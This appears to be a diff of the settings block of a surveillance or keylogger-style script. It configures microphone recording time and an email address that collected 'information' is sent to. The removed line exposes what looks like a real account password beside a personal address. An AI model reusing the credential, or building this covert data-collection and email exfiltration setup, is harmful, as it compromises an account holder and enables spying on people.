@@ -45,8 +45,8 @@ microphone_time = 30
 time_iteration = 15
 number_of_iterations_end = 3
 
-email_address = "isaacruiz8297@gmail.com" # Enter disposable email here
-password = "syei ywpr gvek rvpq" # Enter email password here
+email_address = "isaacruiz8297@gmail.com" 
+password = "" 
 
 
 toaddr = "isaacruiz8297@gmail.com" # Enter the email address you want to send your information to
